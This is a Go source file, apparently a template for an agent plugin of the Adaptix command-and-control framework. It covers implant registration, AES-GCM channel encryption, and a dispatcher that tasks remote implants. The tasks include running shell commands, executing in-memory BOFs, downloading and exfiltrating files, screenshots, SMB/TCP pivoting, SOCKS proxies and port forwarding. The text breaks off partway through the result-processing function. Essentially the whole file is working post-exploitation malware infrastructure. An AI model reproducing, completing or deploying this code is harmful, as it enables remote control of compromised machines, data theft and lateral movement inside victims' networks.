package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	mrand "math/rand/v2"
	"sort"
	"strconv"
	"strings"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
	"github.com/google/shlex"
)

// ─── Teamserver interface ──────────────────────────────────────────────────────
// Methods available at runtime from the teamserver.
// Add or remove methods as needed; only those you call must be listed.

type Teamserver interface {
	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	// Agent management
	TsAgentProcessData(agentId string, bodyData []byte) error
	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error
	TsAgentUpdateDataPartial(agentId string, updateData interface{}) error

	// Build
	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
	TsAgentBuildLog(builderId string, status int, message string) error

	// Console
	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)

	// Pivots
	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsPivotDelete(pivotId string) error

	// Tasks
	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)

	// Downloads
	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error

	// Screenshots
	TsScreenshotAdd(agentId string, Note string, Content []byte) error

	// Client GUI helpers
	TsClientGuiDisksWindows(taskData adaptix.TaskData, drives []adaptix.ListingDrivesDataWin)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)
	TsClientGuiFilesUnix(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataUnix)
	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
	TsClientGuiProcessUnix(taskData adaptix.TaskData, process []adaptix.ListingProcessDataUnix)

	// Tunnels
	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)
	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)
	TsTunnelChannelExists(channelId int) bool
	TsTunnelConnectionClose(channelId int, writeOnly bool)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)
	TsTunnelGetPipe(AgentId string, channelId int) (*io.PipeReader, *io.PipeWriter, error)

	// Terminal
	TsAgentTerminalCloseChannel(terminalId string, status string) error
	TsTerminalConnExists(terminalId string) bool
	TsTerminalConnResume(agentId string, terminalId string, ioDirect bool)
	TsTerminalConnData(terminalId string, data []byte)
	TsTerminalGetPipe(AgentId string, terminalId string) (*io.PipeReader, *io.PipeWriter, error)

	// Encoding utilities
	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string
}

// ─── Types ─────────────────────────────────────────────────────────────────────

type __NAME_CAP__Plugin struct{}

type __NAME_CAP__Extender struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

// ─── Plugin entry point ────────────────────────────────────────────────────────

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &__NAME_CAP__Plugin{}
}

func (p *__NAME_CAP__Plugin) GetExtender() adaptix.ExtenderAgent {
	return &__NAME_CAP__Extender{}
}

// ─── Helpers ───────────────────────────────────────────────────────────────────

func makeProxyTask(packData []byte) adaptix.TaskData {
	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Sync: false}
}

func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getFloatArg(args map[string]any, key string) (float64, error) {
	v, ok := args[key].(float64)
	if !ok {
		return 0, fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getBoolArg(args map[string]any, key string) bool {
	v, _ := args[key].(bool)
	return v
}

// ─── Tunnel callbacks ──────────────────────────────────────────────────────────

func (ext *__NAME_CAP__Extender) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: TunnelMessageConnectTCP,
		ConnectUDP: TunnelMessageConnectUDP,
		WriteTCP:   TunnelMessageWriteTCP,
		WriteUDP:   TunnelMessageWriteUDP,
		Close:      TunnelMessageClose,
		Reverse:    TunnelMessageReverse,
		Pause:      TunnelMessagePause,
		Resume:     TunnelMessageResume,
	}
}

func TunnelMessageConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	addr := fmt.Sprintf("%s:%d", address, port)
	packerData, _ := Marshal(ParamsTunnelStart{Proto: "tcp", ChannelId: channelId, Address: addr})
	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
	packData, _ := Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	addr := fmt.Sprintf("%s:%d", address, port)
	packerData, _ := Marshal(ParamsTunnelStart{Proto: "udp", ChannelId: channelId, Address: addr})
	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
	packData, _ := Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
	return makeProxyTask(data)
}

func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
	return makeProxyTask(data)
}

func TunnelMessagePause(channelId int) adaptix.TaskData {
	packerData, _ := Marshal(ParamsTunnelPause{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_PAUSE, Data: packerData}
	packData, _ := Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageResume(channelId int) adaptix.TaskData {
	packerData, _ := Marshal(ParamsTunnelResume{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_RESUME, Data: packerData}
	packData, _ := Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageClose(channelId int) adaptix.TaskData {
	packerData, _ := Marshal(ParamsTunnelStop{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_STOP, Data: packerData}
	packData, _ := Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
	// TODO: Implement reverse port forward initiation for your protocol.
	// This callback is invoked when the teamserver needs the agent to open
	// a listening port. Pack a COMMAND_RPORTFWD_START (or equivalent) here.
	return makeProxyTask(nil)
}

// ─── Terminal callbacks ────────────────────────────────────────────────────────

func (ext *__NAME_CAP__Extender) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: TerminalMessageStart,
		Write: TerminalMessageWrite,
		Close: TerminalMessageClose,
	}
}

func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	packerData, _ := Marshal(ParamsTerminalStart{TermId: terminalId, Program: program, Height: sizeH, Width: sizeW})
	cmd := Command{Code: COMMAND_TERMINAL_START, Data: packerData}
	packData, _ := Marshal(cmd)
	return makeProxyTask(packData)
}

func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	return makeProxyTask(data)
}

func TerminalMessageClose(terminalId int) adaptix.TaskData {
	packerData, _ := Marshal(ParamsTerminalStop{TermId: terminalId})
	cmd := Command{Code: COMMAND_TERMINAL_STOP, Data: packerData}
	packData, _ := Marshal(cmd)
	return makeProxyTask(packData)
}

// ─── PluginAgent interface ─────────────────────────────────────────────────────
// GenerateConfig, GenerateProfiles, and BuildPayload are in pl_build.go
// (language-specific build variant selected by the generator).

func (p *__NAME_CAP__Plugin) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData

	var si SessionInfo
	err := Unmarshal(beat, &si)
	if err != nil {
		return adaptix.AgentData{}, nil, err
	}

	agentData.Computer = si.Host
	agentData.Username = si.User
	agentData.Domain = ""
	agentData.InternalIP = si.Ipaddr
	agentData.OsDesc = si.OSVersion
	agentData.Elevated = si.Elevated
	agentData.Pid = fmt.Sprintf("%d", si.PID)
	agentData.Tid = ""
	agentData.Arch = "x64"
	agentData.Process = si.Process
	agentData.ACP = int(si.Acp)
	agentData.OemCP = int(si.Oem)
	agentData.SessionKey = si.EncryptKey

	switch strings.ToLower(si.Os) {
	case "windows":
		agentData.Os = adaptix.OS_WINDOWS
	case "linux":
		agentData.Os = adaptix.OS_LINUX
	case "darwin":
		agentData.Os = adaptix.OS_MAC
	default:
		return adaptix.AgentData{}, nil, fmt.Errorf("unsupported OS: %q", si.Os)
	}

	return agentData, &__NAME_CAP__Extender{}, nil
}

// ─── ExtenderAgent interface ───────────────────────────────────────────────────

func (ext *__NAME_CAP__Extender) Encrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

func (ext *__NAME_CAP__Extender) Decrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(data) < gcm.NonceSize() {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:gcm.NonceSize()], data[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func (ext *__NAME_CAP__Extender) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	var objects [][]byte
	for _, taskData := range tasks {
		taskId, err := strconv.ParseUint(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, fmt.Errorf("invalid task id %q: %w", taskData.TaskId, err)
		}
		var command Command
		if err := Unmarshal(taskData.Data, &command); err != nil {
			return nil, fmt.Errorf("unmarshal task %q: %w", taskData.TaskId, err)
		}
		command.Id = uint(taskId)
		cmd, err := Marshal(command)
		if err != nil {
			return nil, fmt.Errorf("marshal task %q: %w", taskData.TaskId, err)
		}
		objects = append(objects, cmd)
	}
	msg := Message{Type: 1, Object: objects}
	packData, err := Marshal(msg)
	return packData, err
}

func (ext *__NAME_CAP__Extender) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	var (
		packData []byte
		err      error
	)

	// TODO: Wrap pivot data into your wire format.
	_ = pivotId
	_ = data
	err = errors.New("pivot not implemented")

	taskData := adaptix.TaskData{
		TaskId: fmt.Sprintf("%08x", mrand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   packData,
		Sync:   false,
	}

	return taskData, err
}

func (ext *__NAME_CAP__Extender) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
		cmd         Command
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: adaptix.MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	switch command {

	case "burst":
		if subcommand == "show" {
			packerData, _ := Marshal(ParamsBurst{SubCmd: 1})
			cmd = Command{Code: COMMAND_BURST, Data: packerData}
		} else if subcommand == "set" {
			enabled, err := getFloatArg(args, "enabled")
			if err != nil {
				goto RET
			}
			sleepMs, err := getFloatArg(args, "sleep")
			if err != nil {
				goto RET
			}
			jitter, err := getFloatArg(args, "jitter")
			if err != nil {
				goto RET
			}
			if int(jitter) < 0 || int(jitter) > 100 {
				err = errors.New("jitter must be between 0 and 100")
				goto RET
			}
			packerData, _ := Marshal(ParamsBurst{SubCmd: 2, Enabled: int(enabled), Sleep: int(sleepMs), Jitter: int(jitter)})
			cmd = Command{Code: COMMAND_BURST, Data: packerData}
		} else {
			err = errors.New("subcommand must be 'show' or 'set'")
			goto RET
		}

	case "cat":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := Marshal(ParamsCat{Path: path})
		cmd = Command{Code: COMMAND_CAT, Data: packerData}

	case "cd":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := Marshal(ParamsCd{Path: path})
		cmd = Command{Code: COMMAND_CD, Data: packerData}

	case "cp":
		src, err := getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err := getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		packerData, _ := Marshal(ParamsCp{Src: src, Dst: dst})
		cmd = Command{Code: COMMAND_CP, Data: packerData}

	case "disks":
		if agentData.Os != adaptix.OS_WINDOWS {
			err = errors.New("disks is only supported on Windows")
			goto RET
		}
		cmd = Command{Code: COMMAND_DISKS}

	case "download":
		taskData.Type = adaptix.TASK_TYPE_JOB

		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}

		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)
		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		packerData, _ := Marshal(ParamsDownload{Path: path, Task: taskData.TaskId})
		cmd = Command{Code: COMMAND_DOWNLOAD, Data: packerData}

	case "execute":
		if agentData.Os != adaptix.OS_WINDOWS {
			err = errors.New("execute is only supported on Windows")
			goto RET
		}

		if subcommand == "bof" {
			taskData.Type = adaptix.TASK_TYPE_JOB

			r := make([]byte, 4)
			_, _ = rand.Read(r)
			taskId := binary.BigEndian.Uint32(r)
			taskData.TaskId = fmt.Sprintf("%08x", taskId)

			asyncMode := getBoolArg(args, "-a")

			bofFile, err := getStringArg(args, "bof")
			if err != nil {
				goto RET
			}
			bofContent, decodeErr := base64.StdEncoding.DecodeString(bofFile)
			if decodeErr != nil {
				err = decodeErr
				goto RET
			}

			paramData, _ := args["param_data"].(string)

			packerData, _ := Marshal(ParamsExecBof{Object: bofContent, ArgsPack: paramData, Task: taskData.TaskId})
			if asyncMode {
				cmd = Command{Code: COMMAND_EXEC_BOF_ASYNC, Data: packerData}
			} else {
				cmd = Command{Code: COMMAND_EXEC_BOF, Data: packerData}
			}
		} else {
			err = errors.New("subcommand must be 'bof'")
			goto RET
		}

	case "exfil":
		taskData.Completed = true
		fileId, err := getStringArg(args, "file_id")
		if err != nil {
			goto RET
		}
		if subcommand == "cancel" {
			_ = Ts.TsDownloadClose(fileId, 4)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = fmt.Sprintf("Download %s canceled", fileId)
			taskData.ClearText = "\n"
		} else if subcommand == "start" {
			_ = Ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_START, nil)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = fmt.Sprintf("Download %s resumed", fileId)
			taskData.ClearText = "\n"
		} else if subcommand == "stop" {
			_ = Ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_FINISH, nil)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = fmt.Sprintf("Download %s stopped", fileId)
			taskData.ClearText = "\n"
		} else {
			err = errors.New("subcommand must be 'cancel', 'start' or 'stop'")
			goto RET
		}

	case "exit":
		cmd = Command{Code: COMMAND_EXIT}

	case "getuid":
		cmd = Command{Code: COMMAND_GETUID}

	case "jobs":
		if subcommand == "list" {
			cmd = Command{Code: COMMAND_JOB_LIST}
		} else if subcommand == "kill" {
			jobId, err := getStringArg(args, "task_id")
			if err != nil {
				goto RET
			}
			packerData, _ := Marshal(ParamsJobKill{Id: jobId})
			cmd = Command{Code: COMMAND_JOB_KILL, Data: packerData}
		} else {
			err = errors.New("subcommand must be 'list' or 'kill'")
			goto RET
		}

	case "link":
		if subcommand == "smb" {
			target, err := getStringArg(args, "target")
			if err != nil {
				goto RET
			}
			pipename, err := getStringArg(args, "pipename")
			if err != nil {
				goto RET
			}
			pipePath := fmt.Sprintf("\\\\%s\\pipe\\%s", target, pipename)
			packerData, _ := Marshal(ParamsLinkSmb{Target: pipePath, Pipename: pipename})
			cmd = Command{Code: COMMAND_LINK, Data: packerData}
		} else if subcommand == "tcp" {
			target, err := getStringArg(args, "target")
			if err != nil {
				goto RET
			}
			port, err := getFloatArg(args, "port")
			if err != nil {
				goto RET
			}
			packerData, _ := Marshal(ParamsLinkTcp{Target: target, Port: int(port)})
			cmd = Command{Code: COMMAND_LINK, Data: packerData}
		} else {
			err = errors.New("subcommand must be 'smb' or 'tcp'")
			goto RET
		}

	case "lportfwd":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		if subcommand == "start" {
			address, err := getStringArg(args, "address")
			if err != nil {
				goto RET
			}
			lport, err := getFloatArg(args, "lport")
			if err != nil {
				goto RET
			}
			fwdhost, err := getStringArg(args, "fwdhost")
			if err != nil {
				goto RET
			}
			fwdport, err := getFloatArg(args, "fwdport")
			if err != nil {
				goto RET
			}

			tunnelId, err2 := Ts.TsTunnelCreateLportfwd(agentData.Id, "", address, int(lport), fwdhost, int(fwdport))
			if err2 != nil {
				err = err2
				goto RET
			}
			taskData.TaskId, err2 = Ts.TsTunnelStart(tunnelId)
			if err2 != nil {
				err = err2
				goto RET
			}
			taskData.Completed = true
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = fmt.Sprintf("Local port forward %s:%d → %s:%d", address, int(lport), fwdhost, int(fwdport))
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			lport, err := getFloatArg(args, "lport")
			if err != nil {
				goto RET
			}
			Ts.TsTunnelStopLportfwd(agentData.Id, int(lport))
			taskData.Completed = true
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "Local port forward stopped"
			taskData.ClearText = "\n"
		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "kill":
		pid, err := getFloatArg(args, "pid")
		if err != nil {
			goto RET
		}
		packerData, _ := Marshal(ParamsKill{Pid: int(pid)})
		cmd = Command{Code: COMMAND_KILL, Data: packerData}

	case "ls":
		dir, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := Marshal(ParamsLs{Path: dir})
		cmd = Command{Code: COMMAND_LS, Data: packerData}

	case "mv":
		src, err := getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err := getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		packerData, _ := Marshal(ParamsMv{Src: src, Dst: dst})
		cmd = Command{Code: COMMAND_MV, Data: packerData}

	case "mkdir":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := Marshal(ParamsMkdir{Path: path})
		cmd = Command{Code: COMMAND_MKDIR, Data: packerData}

	case "profile":
		if subcommand == "chunksize" {
			size, err := getFloatArg(args, "size")
			if err != nil {
				goto RET
			}
			packerData, _ := Marshal(ParamsProfile{SubCmd: 2, IntValue: int(size)})
			cmd = Command{Code: COMMAND_PROFILE, Data: packerData}
		} else if subcommand == "killdate" {
			dateStr, err := getStringArg(args, "date")
			if err != nil {
				goto RET
			}
			t, parseErr := time.Parse("2006-01-02", dateStr)
			if parseErr != nil {
				err = fmt.Errorf("invalid date format (use YYYY-MM-DD): %v", parseErr)
				goto RET
			}
			packerData, _ := Marshal(ParamsProfile{SubCmd: 3, IntValue: int(t.Unix())})
			cmd = Command{Code: COMMAND_PROFILE, Data: packerData}
		} else if subcommand == "workingtime" {
			value, err := getStringArg(args, "value")
			if err != nil {
				goto RET
			}
			packerData, _ := Marshal(ParamsProfile{SubCmd: 4, StrValue: value})
			cmd = Command{Code: COMMAND_PROFILE, Data: packerData}
		} else {
			err = errors.New("subcommand must be 'chunksize', 'killdate' or 'workingtime'")
			goto RET
		}

	case "ps":
		cmd = Command{Code: COMMAND_PS}

	case "pwd":
		cmd = Command{Code: COMMAND_PWD}

	case "rev2self":
		cmd = Command{Code: COMMAND_REV2SELF}

	case "rm":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := Marshal(ParamsRm{Path: path})
		cmd = Command{Code: COMMAND_RM, Data: packerData}

	case "rportfwd":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		if subcommand == "start" {
			lport, err := getFloatArg(args, "lport")
			if err != nil {
				goto RET
			}
			fwdhost, err := getStringArg(args, "fwdhost")
			if err != nil {
				goto RET
			}
			fwdport, err := getFloatArg(args, "fwdport")
			if err != nil {
				goto RET
			}

			_, err2 := Ts.TsTunnelCreateRportfwd(agentData.Id, "", int(lport), fwdhost, int(fwdport))
			if err2 != nil {
				err = err2
				goto RET
			}

			packerData, _ := Marshal(ParamsRportfwdStart{Lport: int(lport), Fwdhost: fwdhost, Fwdport: int(fwdport)})
			cmd = Command{Code: COMMAND_RPORTFWD_START, Data: packerData}

		} else if subcommand == "stop" {
			lport, err := getFloatArg(args, "lport")
			if err != nil {
				goto RET
			}
			Ts.TsTunnelStopRportfwd(agentData.Id, int(lport))

			packerData, _ := Marshal(ParamsRportfwdStop{Lport: int(lport)})
			cmd = Command{Code: COMMAND_RPORTFWD_STOP, Data: packerData}
		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "run":
		taskData.Type = adaptix.TASK_TYPE_JOB

		prog, err := getStringArg(args, "program")
		if err != nil {
			goto RET
		}
		runArgs, _ := args["args"].(string)

		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)
		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		cmdArgs, _ := shlex.Split(runArgs)
		packerData, _ := Marshal(ParamsRun{Program: prog, Args: cmdArgs, Task: taskData.TaskId})
		cmd = Command{Code: COMMAND_RUN, Data: packerData}

	case "shell":
		cmdParam, err := getStringArg(args, "cmd")
		if err != nil {
			goto RET
		}
		if agentData.Os == adaptix.OS_WINDOWS {
			cmdArgs := []string{"/c", cmdParam}
			packerData, _ := Marshal(ParamsShell{Program: "C:\\Windows\\System32\\cmd.exe", Args: cmdArgs})
			cmd = Command{Code: COMMAND_SHELL, Data: packerData}
		} else {
			cmdArgs := []string{"-c", cmdParam}
			packerData, _ := Marshal(ParamsShell{Program: "/bin/sh", Args: cmdArgs})
			cmd = Command{Code: COMMAND_SHELL, Data: packerData}
		}

	case "screenshot":
		cmd = Command{Code: COMMAND_SCREENSHOT}

	case "sleep":
		sleepStr, err := getStringArg(args, "value")
		if err != nil {
			goto RET
		}
		jitterNum, _ := getFloatArg(args, "jitter")

		var sleepSeconds int
		dur, durErr := time.ParseDuration(sleepStr)
		if durErr != nil {
			secs, convErr := strconv.Atoi(sleepStr)
			if convErr != nil {
				err = fmt.Errorf("invalid sleep value '%s': use seconds or duration (e.g. 30m5s)", sleepStr)
				goto RET
			}
			sleepSeconds = secs
		} else {
			sleepSeconds = int(dur.Seconds())
		}

		jitter := int(jitterNum)
		if jitter < 0 || jitter > 100 {
			err = errors.New("jitter must be between 0 and 100")
			goto RET
		}

		{
			packerData, _ := Marshal(ParamsSleep{Sleep: sleepSeconds, Jitter: jitter})
			cmd = Command{Code: COMMAND_SLEEP, Data: packerData}
		}

	case "socks":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		portNumber, ok := args["port"].(float64)
		port := int(portNumber)
		if ok {
			if port < 1 || port > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}
		}

		if subcommand == "start" {
			address, err := getStringArg(args, "address")
			if err != nil {
				goto RET
			}

			auth := getBoolArg(args, "-a")
			if auth {
				username, err := getStringArg(args, "username")
				if err != nil {
					goto RET
				}
				password, err := getStringArg(args, "password")
				if err != nil {
					goto RET
				}

				tunnelId, err2 := Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, true, username, password)
				if err2 != nil {
					err = err2
					goto RET
				}
				taskData.TaskId, err2 = Ts.TsTunnelStart(tunnelId)
				if err2 != nil {
					err = err2
					goto RET
				}
				taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)
			} else {
				tunnelId, err2 := Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, false, "", "")
				if err2 != nil {
					err = err2
					goto RET
				}
				taskData.TaskId, err2 = Ts.TsTunnelStart(tunnelId)
				if err2 != nil {
					err = err2
					goto RET
				}
				taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
			}
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true
			Ts.TsTunnelStopSocks(agentData.Id, port)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "Socks5 server has been stopped"
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "terminate":
		cmd = Command{Code: COMMAND_TERMINATE}

	case "unlink":
		pivotName, err := getStringArg(args, "name")
		if err != nil {
			goto RET
		}
		pivotId, _, _ := Ts.TsGetPivotInfoByName(pivotName)
		if pivotId == "" {
			err = fmt.Errorf("pivot '%s' not found", pivotName)
			goto RET
		}
		{
			packerData, _ := Marshal(ParamsUnlink{Id: pivotId})
			cmd = Command{Code: COMMAND_UNLINK, Data: packerData}
		}

	case "upload":
		remotePath, err := getStringArg(args, "remote_path")
		if err != nil {
			goto RET
		}
		localFile, err := getStringArg(args, "local_file")
		if err != nil {
			goto RET
		}

		fileContent, decodeErr := base64.StdEncoding.DecodeString(localFile)
		if decodeErr != nil {
			err = decodeErr
			goto RET
		}

		zipContent, zipErr := ZipBytes(fileContent, remotePath)
		if zipErr != nil {
			err = zipErr
			goto RET
		}

		chunkSize := 0x500000 // 5MB
		bufferSize := len(zipContent)

		inTaskData := adaptix.TaskData{
			Type:    adaptix.TASK_TYPE_TASK,
			AgentId: agentData.Id,
			Sync:    false,
		}

		for start := 0; start < bufferSize; start += chunkSize {
			fin := start + chunkSize
			finish := false
			if fin >= bufferSize {
				fin = bufferSize
				finish = true
			}

			inPackerData, _ := Marshal(ParamsUpload{
				Path:    remotePath,
				Content: zipContent[start:fin],
				Finish:  finish,
			})
			inCmd := Command{Code: COMMAND_UPLOAD, Data: inPackerData}

			if finish {
				cmd = inCmd
				break
			} else {
				inTaskData.Data, _ = Marshal(inCmd)
				inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())
				Ts.TsTaskCreate(agentData.Id, "", "", inTaskData)
			}
		}

	case "zip":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		zipPath, err := getStringArg(args, "zip_path")
		if err != nil {
			goto RET
		}
		packerData, _ := Marshal(ParamsZip{Src: path, Dst: zipPath})
		cmd = Command{Code: COMMAND_ZIP, Data: packerData}

	default:
		err = fmt.Errorf("command '%v' not found", command)
		goto RET
	}

	taskData.Data, _ = Marshal(cmd)

RET:
	return taskData, messageData, err
}

func (ext *__NAME_CAP__Extender) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var outTasks []adaptix.TaskData

	taskData := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	var (
		inMessage Message
		cmd       Command
		job       Job
	)

	err := Unmarshal(decryptedData, &inMessage)
	if err != nil {
		return errors.New("failed to unmarshal message")
	}

	if inMessage.Type == 1 {

		for _, cmdBytes := range inMessage.Object {
			err = Unmarshal(cmdBytes, &cmd)
			if err != nil {
				continue
			}

			TaskId := cmd.Id
			commandId := cmd.Code
			task := taskData
			task.TaskId = fmt.Sprintf("%08x", TaskId)

			switch commandId {

			case COMMAND_CAT:
				var params AnsCat
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("'%v' file content:", params.Path)
				task.ClearText = string(params.Content)

			case COMMAND_CD:
				var params AnsPwd
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Current working directory:"
				task.ClearText = params.Path

			case COMMAND_CP:
				task.Message = "Object copied successfully"

			case COMMAND_EXEC_BOF:
				var params AnsExecBof
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var msgs []BofMsg
				err = Unmarshal(params.Msgs, &msgs)
				if err != nil {
					continue
				}

				task.Message = "BOF output"

				for _, msg := range msgs {
					if msg.Type == CALLBACK_AX_SCREENSHOT {
						buf := bytes.NewReader(msg.Data)
